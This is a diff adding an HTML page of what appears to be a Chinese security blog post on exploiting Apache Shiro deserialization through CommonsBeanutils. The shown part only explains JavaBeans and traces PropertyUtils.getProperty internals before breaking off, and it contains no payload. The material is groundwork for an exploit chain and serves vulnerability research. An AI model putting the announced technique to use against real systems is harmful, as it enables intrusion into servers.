@@ -1,0 +1,1237 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    <meta name="description" content="Hexo Theme Redefine">
+    <meta name="author" content="GTL-JU">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-redefine.png">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://evan.beee.top" crossorigin>
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2023/10/31/shiro打.commonsbeanutils依赖与/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="一、前言在前面我们分析了shiro打CC依赖，但是shiro默认是没有CommonCollections依赖的，那么如果没有CC依赖我们想要进行利用，就有使用shiro默认的依赖去打。 那我们这里可以先看一下shiro默认的依赖有那些：  我们可以看到在shiro默认的包中有一个commons-beanutils包。这也就是我们在无CC依赖的情况下可以利用的包。 Apache Commons Be">
+<meta property="og:type" content="article">
+<meta property="og:title" content="shiro无CC打CB依赖">
+<meta property="og:url" content="http://example.com/2023/10/31/shiro%E6%89%93.CommonsBeanutils%E4%BE%9D%E8%B5%96%E4%B8%8E/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="一、前言在前面我们分析了shiro打CC依赖，但是shiro默认是没有CommonCollections依赖的，那么如果没有CC依赖我们想要进行利用，就有使用shiro默认的依赖去打。 那我们这里可以先看一下shiro默认的依赖有那些：  我们可以看到在shiro默认的包中有一个commons-beanutils包。这也就是我们在无CC依赖的情况下可以利用的包。 Apache Commons Be">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231019105944821.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031104849725.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031114923819.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031145744508.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031150255706.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031150517927.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031152505615.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031153422527.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031153445152.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031153728719.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031160135094.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031163200522.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031163208266.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031163323611.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031163355725.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031163716087.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031170542682.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031172347359.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031172240781.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031172523556.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031172948974.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031173807933.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031173855396.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031174301451.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031174349812.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031174404276.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031174423347.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031175118727.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031185851157.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031190137166.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031190201981.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031190320681.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031190629805.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031190945188.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031191256878.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031192848860.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031193131789.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20230907201949994.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031195224455.png">
+<meta property="og:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031201238707.png">
+<meta property="article:published_time" content="2023-10-31T12:14:40.000Z">
+<meta property="article:modified_time" content="2023-10-31T12:17:03.572Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="java">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231019105944821.png">
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/logo.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/logo.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/logo.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            shiro无CC打CB依赖 -
+        
+        JU blog
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    
+<link rel="stylesheet" href="/assets/fonts.css">
+
+    <!--- Font Part-->
+    
+    
+    
+        <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap" rel="stylesheet">
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    let Global = window.Global || {};
+    Global.hexo_config = {"hostname":"example.com","root":"/","language":"zh-CN","path":"search.xml"};
+    Global.theme_config = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":true,"list":["php","java","比赛wp","环境搭建"]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":true,"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":true,"family":"Noto Sans SC","url":"https://fonts.googleapis.com/css2?family=Noto+Sans+SC:wght@400;500;700&display=swap"},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"busuanzi_counter":{"enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"pjax":true,"open_graph":true},"home_banner":{"enable":true,"image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"JU's blog","subtitle":{"text":[],"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"audios":[{"name":null,"artist":null,"url":null,"cover":null},{"name":null,"artist":null,"url":null,"cover":null}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.1.0","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Status":{"path":"https://status.evanluo.top/","icon":"fa-regular fa-chart-bar"},"About":{"icon":"fa-regular fa-user","submenus":{"Me":"/about","Github":"https://github.com/GTL-JU","Blog":"https://www.cnblogs.com/GTL-JU/","Friends":"/friends"}},"友链":{"icon":"fa-regular fa-link","path":"/links/"}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}}};
+    Global.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="pjax-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container">
+
+    
+
+    <div class="main-content-container">
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                JU blog
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        首页
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        归档
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    target="_blank" rel="noopener" href="https://status.evanluo.top/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-chart-bar"></i>
+                                        
+                                        状态
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        关于&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/about">ME
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/GTL-JU">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://www.cnblogs.com/GTL-JU/">BLOG
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a href="/friends">友情链接
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/links/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-link"></i>
+                                        
+                                        友链
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                    
+                        <li class="navbar-item search search-popup-trigger">
+                            <i class="fa-solid fa-magnifying-glass"></i>
+                        </li>
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i></div>
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer">
+        <ul class="drawer-navbar-list">
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                首页
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                归档
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        target="_blank" rel="noopener" href="https://status.evanluo.top/"  >
+                             
+                                
+                                    <i class="fa-regular fa-chart-bar"></i>
+                                
+                                状态
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                关于&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="dropdown-item flex-center">
+                                <a class="dropdown-item" href="/about">ME</a>
+                            </li>
+                        
+                            <li class="dropdown-item flex-center">
+                                <a class="dropdown-item" target="_blank" rel="noopener" href="https://github.com/GTL-JU">GITHUB</a>
+                            </li>
+                        
+                            <li class="dropdown-item flex-center">
+                                <a class="dropdown-item" target="_blank" rel="noopener" href="https://www.cnblogs.com/GTL-JU/">BLOG</a>
+                            </li>
+                        
+                            <li class="dropdown-item flex-center">
+                                <a class="dropdown-item" href="/friends">友情链接</a>
+                            </li>
+                        
+                    
+            
+                
+                    <li class="drawer-navbar-item flex-center">
+                        <a class="" 
+                        href="/links/"  >
+                             
+                                
+                                    <i class="fa-regular fa-link"></i>
+                                
+                                友链
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="fade-in-down-animation">
+    <div class="post-page-container">
+        <div class="article-content-container">
+
+            
+            
+                <div class="article-title">
+                    <h1 class="article-title-regular">shiro无CC打CB依赖</h1>
+                </div>
+            
+                
+            
+
+            
+                <div class="article-header">
+                    <div class="avatar">
+                        <img src="/images/logo.png">
+                    </div>
+                    <div class="info">
+                        <div class="author">
+                            <span class="name">GTL-JU</span>
+                            
+                                <span class="author-label">Lv3</span>
+                            
+                        </div>
+                        <div class="meta-info">
+                            <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2023-10-31 20:14:40</span>
+        <span class="mobile">2023-10-31 20:14</span>
+        <span class="hover-info">创建</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2023-10-31 20:17:03</span>
+            <span class="mobile">2023-10-31 20:17</span>
+            <span class="hover-info">更新</span>
+        </span>
+    
+
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/java/">java</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+        <span class="article-wordcount article-meta-item">
+            <i class="fa-regular fa-typewriter"></i>&nbsp;<span>4.4k 字</span>
+        </span>
+    
+    
+        <span class="article-min2read article-meta-item">
+            <i class="fa-regular fa-clock"></i>&nbsp;<span>18 分钟</span>
+        </span>
+    
+    
+</div>
+
+                        </div>
+                    </div>
+                </div>
+            
+
+            <div class="article-content markdown-body">
+                <h1 id="一、前言"><a href="#一、前言" class="headerlink" title="一、前言"></a>一、前言</h1><p>在前面我们分析了shiro打CC依赖，但是shiro默认是没有CommonCollections依赖的，那么如果没有CC依赖我们想要进行利用，就有使用shiro默认的依赖去打。</p>
+<p>那我们这里可以先看一下shiro默认的依赖有那些：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231019105944821.png"
+                      alt="image-20231019105944821"
+                ></p>
+<p>我们可以看到在shiro默认的包中有一个commons-beanutils包。这也就是我们在无CC依赖的情况下可以利用的包。</p>
+<p>Apache Commons Beanutils 是 Apache Commons 工具集下的另一个项目，它提供了对普通Java类对象（也称为JavaBean）的一些操作方法。具体的可以看这篇文章<a class="link"   target="_blank" rel="noopener" href="https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680" >https://www.liaoxuefeng.com/wiki/1252599548343744/1260474416351680 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h1 id="二、JavaBean"><a href="#二、JavaBean" class="headerlink" title="二、JavaBean"></a>二、JavaBean</h1><p>我们这里简单的来学习一下什么是javabean，javabean其实就是一个概念</p>
+<p>我们这里通过一个小demo来看一下：</p>
+<p>person类：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">public class Person &#123;</span><br><span class="line">    private String name;</span><br><span class="line">    private int age;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123; return this.name; &#125;</span><br><span class="line">    public void setName(String name) &#123; this.name = name; &#125;</span><br><span class="line"></span><br><span class="line">    public int getAge() &#123; return this.age; &#125;</span><br><span class="line">    public void setAge(int age) &#123; this.age = age; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>test类：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) &#123;</span><br><span class="line">        Person person=new Person();</span><br><span class="line">        person.setAge(12);</span><br><span class="line">        person.setName(&quot;hacker&quot;);</span><br><span class="line">        System.out.println(person.getAge());</span><br><span class="line">        System.out.println(person.getName());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>运行结果：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031104849725.png"
+                      alt="image-20231031104849725"
+                ></p>
+<p>在java中我们经常会使用set和get方法去设置和获取属性值</p>
+<p>那么这里Person就被称为javabean</p>
+<p>如果读写方法符合以下这种命名规范：</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">// 读方法:</span><br><span class="line">public Type getXyz()</span><br><span class="line">// 写方法:</span><br><span class="line">public void setXyz(Type value)</span><br></pre></td></tr></table></figure></div>
+
+<p>这种class就被称为javabean</p>
+<p>JavaBean是一种用于构建可重用组件的Java类的规范。它不是Java语言的某种特定类型，而是一种编程规范，用于创建可移植、可重用的Java对象。JavaBean通常是无状态的、可序列化的、具有无参构造函数的类，它们通过提供getter和setter方法来封装对象的属性。</p>
+<p> 然后commons-beanutils中提供了一个静态方法 PropertyUtils.getProperty ，让使用者可以直接调用任意JavaBean的getter方法，而不用在通过函数去调用。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public class test &#123;</span><br><span class="line">    public static void main(String[] args) throws InvocationTargetException, IllegalAccessException, NoSuchMethodException &#123;</span><br><span class="line">        Person person=new Person();</span><br><span class="line">        person.setName(&quot;hacker&quot;);</span><br><span class="line">        person.setAge(12);</span><br><span class="line">        System.out.println(PropertyUtils.getProperty(person, &quot;name&quot;));</span><br><span class="line">        System.out.println(PropertyUtils.getProperty(person, &quot;age&quot;));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>运行结果：</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031114923819.png"
+                      alt="image-20231031114923819"
+                ></p>
+<p>我们这里打断点调一下，看他是怎么获取的，底层是如何实现的</p>
+<p>在上面我们是通过PropertyUtils类的getProperty方法去获取get方法的，那我们这里跟进这个方法看一下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031145744508.png"
+                      alt="image-20231031145744508"
+                ></p>
+<p><code>ropertyUtilsBean.getInstance()</code>：这部分获取了<code>PropertyUtilsBean</code>的实例，<code>PropertyUtilsBean</code>是Apache Commons BeanUtils库中用于访问JavaBean属性的工具类。</p>
+<p>然后使用<code>PropertyUtilsBean</code>的<code>getProperty</code>方法来获取给定JavaBean对象（<code>bean</code>）的指定属性（<code>name</code>）的值。</p>
+<p>最终返回从JavaBean对象中获取的属性值，这个值被封装为<code>Object</code>类型。</p>
+<p>我们继续跟进这个<code>getProperty</code>方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031150255706.png"
+                      alt="image-20231031150255706"
+                ></p>
+<p>这里传入两个参数一个是我们的javabean对象，一个是要获取的属性名</p>
+<p>然后调用<code>getNestedProperty()</code>方法进行处理</p>
+<p>我们这里跟进去看一下</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031150517927.png"
+                      alt="image-20231031150517927"
+                ></p>
+<p>首先就判断javabean对象和要获取的属性名是否为空</p>
+<p>中间部分就是通过一个 循环使用了一些分隔符来处理复杂的属性名，例如嵌套属性。</p>
+<p>中间这部分我们就不看了，直接看核心获取属性值的这部分代码</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031152505615.png"
+                      alt="image-20231031152505615"
+                ></p>
+<p>这个地方也就是通过判断属性名的类型以不同方式获取 JavaBean 对象的属性值</p>
+<p>首先会先判断我们的javabean对象是不是一个map类型的</p>
+<p>是map类型则会调用<code>bean = ((Map) bean).get(name);</code>通过这个get方法从map中获取属性值</p>
+<p>不是则继续判断是不是<code>indexOfMAPPED_DELIM</code>和<code>indexOfINDEXED_DELIM</code>的值是否大于0</p>
+<p>其实上面还要两行代码就是这个两个属性的值的获取</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">indexOfINDEXED_DELIM = name.indexOf(PropertyUtils.INDEXED_DELIM);</span><br><span class="line">indexOfMAPPED_DELIM = name.indexOf(PropertyUtils.MAPPED_DELIM);</span><br></pre></td></tr></table></figure></div>
+
+<p>两行代码的目的是在属性名字符串 <code>name</code> 中查找索引属性分隔符和映射属性分隔符的位置。</p>
+<p>但是很明显我们传入进来的没有索引属性和映射属性</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031153422527.png"
+                      alt="image-20231031153422527"
+                ></p>
+<p>所以这里的值都是-1</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031153445152.png"
+                      alt="image-20231031153445152"
+                ></p>
+<p>为什么是-1这是我们在上面初始化的时候定义的，如果查找到有索引属性和映射属性就将属性位置赋值给变量</p>
+<p>那这里这两个if的作用就很明显了判断是否是索引属性或者映射属性，是的话调用相应的方法去处理</p>
+<p>，不是则继续向下走。</p>
+<p>我们这里就传入了一个name属性，很明显都不符合上面的要求，那么就会进入到else里面</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031153728719.png"
+                      alt="image-20231031153728719"
+                ></p>
+<p>我们这里会调用<code>getSimpleProperty</code>方法去处理我们的属性，获取属性值</p>
+<p>我们继续跟进到这个方法</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031160135094.png"
+                      alt="image-20231031160135094"
+                ></p>
+<p>这个方法的前半部分还是在判读bean对象和属性名是否存在，然后后面就判读是否包含特定的属性分隔符，也就是我们在前面说的索引属性或者映射属性。如果包含，则抛出相应的异常。这是一种验证机制，用于确保属性名不包含嵌套属性、索引属性或映射属性的分隔符。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PropertyDescriptor descriptor =getPropertyDescriptor(bean, name);</span><br><span class="line">        if (descriptor == null) &#123;</span><br><span class="line">            throw new NoSuchMethodException(&quot;Unknown property &#x27;&quot; +</span><br><span class="line">                    name + &quot;&#x27;&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        Method readMethod = getReadMethod(descriptor);</span><br><span class="line">        if (readMethod == null) &#123;</span><br><span class="line">            throw new NoSuchMethodException(&quot;Property &#x27;&quot; + name +</span><br><span class="line">                    &quot;&#x27; has no getter method&quot;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        // Call the property getter and return the value</span><br><span class="line">        Object value = invokeMethod(readMethod, bean, new Object[0]);</span><br><span class="line">        return (value);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>
+
+<p>然后真正的处理方法是getPropertyDescriptor。</p>
+<p><code>PropertyDescriptor</code> 是Java Beans API中的一个类，它包含了有关属性的信息，包括属性的getter和setter方法。</p>
+<p><code>getPropertyDescriptor</code>方法的目的是获取与属性名匹配的属性描述符。如果找不到匹配的属性描述符，<code>descriptor</code> 将为 <code>null</code>。然后经过if判读将抛出异常。</p>
+<p>如果获取到了属性描述符，则会通过 getReadMethod方法获取相应的getter方法。</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Method readMethod = getReadMethod(descriptor);</span><br></pre></td></tr></table></figure></div>
+
+<p>如果找到了属性描述符，代码会调用 <code>getReadMethod</code> 方法来获取属性的getter方法。</p>
+<p><code>getReadMethod</code> 方法是用于从属性描述符中获取getter方法的工具方法。如果找不到getter方法，<code>readMethod</code> 将为 <code>null</code>。抛出异常</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031163200522.png"
+                      alt="image-20231031163200522"
+                ></p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="https://jublog.oss-cn-beijing.aliyuncs.com/image/image-20231031163208266.png"
+                      alt="image-20231031163208266"
+                ></p>
